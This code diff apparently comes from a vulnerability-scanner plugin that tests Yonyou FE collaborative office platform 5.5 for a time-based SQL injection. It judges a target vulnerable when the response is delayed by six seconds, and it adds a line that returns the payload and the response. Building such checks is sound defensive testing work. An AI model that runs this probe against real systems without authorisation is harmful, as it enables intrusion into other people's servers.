@@ -32,6 +32,7 @@ class yonyou_fe_treeXml_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
                 cprint("[+]存在用友FE协作办公平台5.5 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "用友FE协作办公平台5.5 SQL注入", payload, req.text
             else:
                 cprint("[-]不存在yonyou_fe_treeXml_sqli漏洞", "white", "on_grey")
                 return False, None, None, None, None
